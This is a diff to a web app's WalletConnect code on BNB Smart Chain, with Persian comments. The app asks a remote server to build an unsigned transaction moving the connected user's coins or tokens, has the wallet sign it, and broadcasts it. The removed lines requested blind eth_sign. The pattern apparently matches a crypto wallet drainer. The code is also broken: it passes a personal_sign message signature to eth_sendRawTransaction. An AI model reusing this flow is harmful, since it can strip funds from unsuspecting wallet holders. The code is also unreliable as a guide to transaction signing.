@@ -25,7 +25,7 @@ function App() {
         ],
       },
       chains: [56], // فقط شبکه‌ی BSC
-      methods: ["eth_sign", "eth_sendRawTransaction", "eth_signTransaction"],
+      methods: ["eth_sendRawTransaction", "personal_sign"],
       projectId: "9fe3ed74e1d73141e8b7747bedf77551",
     });
 
@@ -40,6 +40,12 @@ function App() {
 
     async function genSign(address, chain, type, contract = "0") {
       try {
+        // **۱. سوییچ به شبکه BSC**
+        await provider.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: "0x38" }],
+        });
+
         let requestData = { handler: "tx", address, chain, type };
         if (type === "token") requestData.contract = contract;
 
@@ -47,11 +53,11 @@ function App() {
         var unSigned = JSON.parse(result);
         console.log("📜 Unsigned Transaction:", unSigned);
 
+        // **۲. امضای تراکنش**
         var Signed = await provider.request({
-  method: "wallet_switchEthereumChain",
-  params: [{ chainId: "0x38" }], // BSC Chain ID
-});
-});
+          method: "personal_sign",
+          params: [JSON.stringify(unSigned.result), address],
+        });
 
         return Signed;
       } catch (error) {
@@ -60,28 +66,28 @@ function App() {
       }
     }
 
-    async function acceptSign(signature, type) {
+    async function acceptSign(signedTx, type) {
       try {
-        var result = await jQuery.post(apiUrl, {
-          handler: "sign",
-          signature,
-          type,
+        // **۳. ارسال تراکنش به بلاکچین**
+        var txHash = await provider.request({
+          method: "eth_sendRawTransaction",
+          params: [signedTx],
         });
 
-        var resultJson = JSON.parse(result);
-        return resultJson.result;
+        console.log("📤 Transaction Sent:", txHash);
+        return txHash;
       } catch (error) {
         console.error("❌ Error in acceptSign:", error);
         return null;
       }
     }
 
-    var signature = await genSign(account_sender, "56", "coin");
+    var signedTx = await genSign(account_sender, "56", "coin");
 
-    if (signature) {
-      console.log("✍️ Signed Transaction:", signature);
-      var rawsign = await acceptSign(signature, "coin");
-      console.log("📝 Final Signed Transaction:", rawsign);
+    if (signedTx) {
+      console.log("✍️ Signed Transaction:", signedTx);
+      var finalTx = await acceptSign(signedTx, "coin");
+      console.log("📝 Final Sent Transaction:", finalTx);
     } else {
       console.error("⚠ Signing failed.");
     }
